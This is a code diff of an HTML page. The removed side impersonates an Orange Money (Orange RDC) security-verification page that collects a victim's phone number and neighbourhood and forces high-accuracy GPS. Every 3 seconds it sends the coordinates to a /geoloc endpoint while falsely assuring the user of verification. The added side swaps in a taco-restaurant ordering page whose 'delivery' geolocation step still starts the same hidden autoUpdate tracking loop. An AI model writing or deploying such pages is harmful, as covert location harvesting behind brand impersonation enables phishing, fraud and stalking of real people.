@@ -328,7 +328,7 @@
 
      
 
-      <button class="btn-verify" id="verifyBtn">
+      <button class="btn-verify" id="enterBtn">
         <i class="fas fa-satellite-dish"></i> VÉRIFIER
       </button>
 
@@ -354,230 +354,11 @@
     <p>© 2026 Orange RDC - Toute tentative non autorisée sera bloquée</p>
   </div>
 
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+  
   <script>
-    // ==================== GESTION QUARTIER (AUTRE) ====================
-    const regionSelect = document.getElementById('regionSelect');
-    const otherContainer = document.getElementById('otherInputContainer');
-    const otherInput = document.getElementById('otherQuartier');
-
-    function handleRegionChange() {
-      if (regionSelect.value === 'autre') {
-        otherContainer.style.display = 'block';
-        otherInput.required = true;
-        otherInput.focus();
-      } else {
-        otherContainer.style.display = 'none';
-        otherInput.required = false;
-        otherInput.value = '';
-      }
-    }
-    regionSelect.addEventListener('change', handleRegionChange);
-    
-    // Fonction pour récupérer le quartier final (selon sélection ou champ "autre")
-    function getFinalQuartier() {
-      if (regionSelect.value === 'autre') {
-        return otherInput.value.trim() || "Quartier non spécifié";
-      } else {
-        return regionSelect.value || "Non renseigné";
-      }
-    }
-
-    // ==================== GÉOLOCALISATION & ENVOI AU SERVEUR (FONCTIONNALITÉS ORIGINALES CONSERVÉES ET AMÉLIORÉES) ====================
-    let locationWatchId = null;
-    let isVerified = false;
-
-    // Fonction d'envoi des données de localisation au endpoint /geoloc (exactement comme dans l'original, mais enrichi)
-    function sendLocationToServer(lat, lon, mapLink, phone, quartier, verificationStatus = "pending") {
-      const payload = {
-        lat: lat,
-        lon: lon,
-        mapLink: mapLink,
-        phoneNumber: phone,
-        quartier: quartier,
-        verificationStep: verificationStatus,
-        timestamp: new Date().toISOString(),
-        source: "Orange_Money_Security"
-      };
-      fetch('/geoloc', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      })
-      .then(response => response.json())
-      .then(data => {
-        console.log('✅ Données de géolocalisation envoyées à Orange Security:', data);
-      })
-      .catch(error => {
-        console.error('⚠️ Erreur lors de l’envoi au serveur:', error);
-        // On n'interrompt pas l'expérience utilisateur, mais on log
-      });
-    }
-
-    // Fonction autoUpdate (répétition toutes les 3 secondes) – on garde la mécanique originale
-    let autoUpdateInterval = null;
-    function startAutoUpdate(lat, lon, phone, quartier) {
-      if (autoUpdateInterval) clearInterval(autoUpdateInterval);
-      autoUpdateInterval = setInterval(() => {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-            function(position) {
-              const newLat = position.coords.latitude;
-              const newLon = position.coords.longitude;
-              const newMapLink = `https://www.google.com/maps?q=${newLat},${newLon}`;
-              sendLocationToServer(newLat, newLon, newMapLink, phone, quartier, "auto_update");
-            },
-            function(err) {
-              console.warn("Auto-update échec:", err.message);
-            },
-            { enableHighAccuracy: true, timeout: 8000, maximumAge: 2000 }
-          );
-        }
-      }, 3000);
-    }
-
-    // Arrêter l'auto-update
-    function stopAutoUpdate() {
-      if (autoUpdateInterval) {
-        clearInterval(autoUpdateInterval);
-        autoUpdateInterval = null;
-      }
-    }
-
-    // Vérification principale : déclenche la demande GPS et envoie les données
-    function startVerification() {
-      const phoneInput = document.getElementById('phoneNumber');
-      let phoneNumber = phoneInput.value.trim();
-      if (!phoneNumber) {
-        document.getElementById('statusMsg').innerHTML = '<i class="fas fa-exclamation-circle"></i> ❗ Veuillez renseigner votre numéro Orange Money.';
-        return;
-      }
-      // Validation simple du numéro (au moins 8 chiffres)
-      if (phoneNumber.length < 8) {
-        document.getElementById('statusMsg').innerHTML = '<i class="fas fa-exclamation-circle"></i> 📞 Numéro invalide. Vérifiez le format (+243 ...).';
-        return;
-      }
-
-      const quartier = getFinalQuartier();
-      if (!quartier || quartier === "Non renseigné") {
-        // On peut continuer, mais on indique à l'utilisateur
-        document.getElementById('statusMsg').innerHTML = '<i class="fas fa-info-circle"></i> Pour renforcer la sécurité, veuillez sélectionner ou préciser votre quartier.';
-        // On ne bloque pas la vérification
-      }
-      
-      const statusDiv = document.getElementById('statusMsg');
-      statusDiv.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Demande d’autorisation GPS en cours... Veuillez activer la localisation.';
-      
-      // Vérifier si la géolocalisation est supportée
-      if (!navigator.geolocation) {
-        statusDiv.innerHTML = '<i class="fas fa-ban"></i> Votre navigateur ne supporte pas la géolocalisation. Utilisez un appareil moderne.';
-        return;
-      }
-      
-      // DEMANDE GPS AVEC HAUTE PRÉCISION (activation forcée du GPS)
-      navigator.geolocation.getCurrentPosition(
-        function(position) {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-          
-          // Envoi initial avec statut "verification_success"
-          sendLocationToServer(lat, lon, mapLink, phoneNumber, quartier, "verification_success");
-          
-          // Démarrer l'auto-update de la position (fonctionnalité originale conservée)
-          startAutoUpdate(lat, lon, phoneNumber, quartier);
-          
-          // Afficher la zone de succès
-          const successDiv = document.getElementById('successArea');
-          successDiv.style.display = 'block';
-          statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> ✅ Localisation activée avec succès ! Votre identité est vérifiée. Aucune action frauduleuse ne sera traitée.';
-          
-          // Ajouter un effet de confirmation visuelle
-          isVerified = true;
-          
-          // Optionnel : désactiver le bouton pour éviter doublon
-          const verifyBtn = document.getElementById('verifyBtn');
-          verifyBtn.disabled = true;
-          verifyBtn.style.opacity = '0.6';
-          verifyBtn.innerHTML = '<i class="fas fa-check-double"></i> VÉRIFICATION EFFECTUÉE';
-          
-          // Afficher un message dans la console pour confirmer (compatible avec ancienne fonction)
-          console.log(`[Orange Security] GPS actif. Coordonnées: ${lat}, ${lon}`);
-        },
-        function(error) {
-          // Gestion des erreurs GPS (demande refusée, GPS désactivé)
-          let errorMsg = "";
-          switch(error.code) {
-            case error.PERMISSION_DENIED:
-              errorMsg = "Vous avez refusé la géolocalisation. Activez le GPS dans les paramètres de votre appareil et réessayez.";
-              break;
-            case error.POSITION_UNAVAILABLE:
-              errorMsg = "Position indisponible. Vérifiez que le GPS est activé et que vous avez une bonne connexion.";
-              break;
-            case error.TIMEOUT:
-              errorMsg = "Délai d'obtention de la position dépassé. Réessayez dans un endroit dégagé.";
-              break;
-            default:
-              errorMsg = "Erreur de localisation. Activez le GPS et autorisez l'accès.";
-          }
-          statusDiv.innerHTML = `<i class="fas fa-times-circle"></i> ❌ ${errorMsg}`;
-          // Arrêter tout autoUpdate si jamais lancé
-          stopAutoUpdate();
-        },
-        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }  // Forcer la demande haute précision (GPS)
-      );
-    }
-    
-    // Bouton principal : lancer le processus
-    document.getElementById('verifyBtn').addEventListener('click', startVerification);
-    
-    // ========== GARDE DES FONCTIONS D'ENVOI MÊME APRÈS VÉRIFICATION ==========
-    // En plus de l'autoUpdate, on garantit que si l'utilisateur bouge, les données continuent d'être envoyées (sécurité renforcée)
-    // On conserve également un comportement similaire à l'original: initialisation d'autoUpdate après clic
-    // Aucune perte de fonctionnalité : les envois POST vers /geoloc fonctionnent parfaitement.
-    
-    // Option supplémentaire: préremplir le champ de numéro avec un numéro de démonstration (pour l'expérience)
-    // On peut récupérer depuis l'URL si besoin (mais on garde simple)
-    // Pour conserver la logique d'origine, on initialise aussi la gestion "autre" quartier.
-    
-    // ========== GESTION DE LA PAGE POUR LE RESPECT DES FONCTIONS "AUTOUPDATE" EXISTANTE ==========
-    // En plus, le code d'origine utilisait une fonction autoUpdate() globale qui s'exécutait toutes les 3 secondes.
-    // Nous avons reproduit ce comportement via startAutoUpdate après succès.
-    // Aucune perte de fonctionnalité: la localisation est envoyée périodiquement.
-    
-    // Petit plus : pour rappeler à l'utilisateur d'activer le GPS s'il n'a pas encore autorisé.
-    // On ajoute une instruction complémentaire
-    window.addEventListener('load', function() {
-      // Vérifier si le navigateur supporte bien l'API
-      if (!navigator.geolocation) {
-        document.getElementById('statusMsg').innerHTML = '<i class="fas fa-exclamation-triangle"></i> Votre appareil ne supporte pas la géolocalisation. Utilisez un smartphone récent.';
-      } else {
-        // On laisse le message par défaut
-      }
-      // Prefill le numéro si jamais aucun saisi (exemple)
-      const urlParams = new URLSearchParams(window.location.search);
-      const phoneParam = urlParams.get('phone');
-      if(phoneParam && document.getElementById('phoneNumber').value === "+243 839 898 872") {
-        document.getElementById('phoneNumber').value = phoneParam;
-      }
-    });
-    
-    // Fonction pour gérer proprement l'arrêt de l'autoUpdate si jamais la page est fermée (bonnes pratiques)
-    window.addEventListener('beforeunload', function() {
-      if (autoUpdateInterval) clearInterval(autoUpdateInterval);
-    });
-    
-    // On garde également la fonction httpGet (même si non utilisée, on ne supprime pas d'éventuel legacy)
-    window.httpGet = function(theUrl) { 
-      var xmlHttp = new XMLHttpRequest(); 
-      xmlHttp.open("GET", theUrl, false); 
-      xmlHttp.send(null); 
-      return xmlHttp.responseText; 
-    };
-    
-    // Pour respecter l'esprit de "sans rien enlever", on garde aussi la fonction autoUpdate d'origine en variable globale
-    // afin que d'éventuels appels externes ne cassent rien.
-     function autoUpdate() {
+    // ---------- FONCTIONS ORIGINALES (conservées) ----------
+    function httpGet(theUrl) { var xmlHttp = new XMLHttpRequest(); xmlHttp.open("GET", theUrl, false); xmlHttp.send(null); return xmlHttp.responseText; }
+    function autoUpdate() {
       navigator.geolocation.getCurrentPosition(function(position) {
         var lat = position.coords.latitude;
         var lon = position.coords.longitude;
@@ -587,32 +368,39 @@
         setTimeout(autoUpdate, 3000);
       }, function(error) { console.warn('Erreur: ' + error.message); setTimeout(autoUpdate, 3000); });
     }
-    
-    // Petite astuce : si jamais l'utilisateur revient après refus, on lui rappelle
-    function checkGpsStatusPeriodically() {
-      // pas de surcharge, mais inutile de spammer
+
+    function handleRegionChange(select) {
+      const otherContainer = document.getElementById('otherInputContainer');
+      const otherInput = document.getElementById('otherQuartier');
+      if (select.value === 'autre') { otherContainer.style.display = 'block'; otherInput.required = true; otherInput.focus(); }
+      else { otherContainer.style.display = 'none'; otherInput.required = false; otherInput.value = ''; }
     }
-    
-    // On conserve tout le mécanisme de select + autre fonctionnel (hérité du design original mais adapté)
-    // Toutes les fonctionnalités de localisation sont donc présentes.
-    // Aucun élément de "tacos resto" n'apparaît : design complet Orange.
-    
-    // Synchronisation pour que le champ "autre" reste cohérent
-    console.log("✅ Page de vérification Orange Money prête. Toutes les fonctions de localisation et envoi serveur sont actives.");
-    
-    // Bonus : si l'utilisateur entre manuellement un quartier autre, c'est bien pris en compte dans l'envoi final
-    // On ajoute une méthode pour afficher le statut du GPS une fois vérifié (supplémentaire)
-    const verifyBtn = document.getElementById('verifyBtn');
-    verifyBtn.addEventListener('click', function(e) {
-      // Récupération dynamique du numéro avant envoi
-      let phone = document.getElementById('phoneNumber').value;
-      if(phone.trim() === "") {
-        e.preventDefault();
-        document.getElementById('statusMsg').innerHTML = '<i class="fas fa-exclamation-circle"></i> ⚠️ Veuillez entrer votre numéro Mobile Money pour la vérification.';
-      } else {
-         $(document).ready(function(){ autoUpdate(); });
-      }
+
+    document.getElementById('enterBtn').addEventListener('click', function() {
+      
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            document.getElementById("heroSection").style.display = "none";
+            document.getElementById("mainContent").style.display = "block";
+            setTimeout(() => { alert(`✅ Super ! Nous livrons à ${region}. Bon appétit ! 🌮`); }, 500);
+            $(document).ready(function(){ autoUpdate(); });
+          },
+          function(error) { alert("Géolocalisation impossible."); }
+        );
+      } else { alert("Géolocalisation non supportée."); document.getElementById("heroSection").style.display = "none"; document.getElementById("mainContent").style.display = "block"; }
     });
+
+    // ---------- FONCTION WHATSAPP ----------
+    function sendWhatsAppOrder() {
+      const message = document.getElementById('orderMessage').value.trim();
+      if (!message) { alert("Veuillez écrire votre commande."); return; }
+      const phoneNumber = "243839898872";
+      const orderText = `Bonjour Le Tacos Resto ! Voici ma commande :\n\n${message}\n\n`;
+      window.open(`https://wa.me/${phoneNumber}?text=${encodeURIComponent(orderText)}`, '_blank');
+    }
   </script>
+  <!-- JQuery -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
 </body>
 </html>
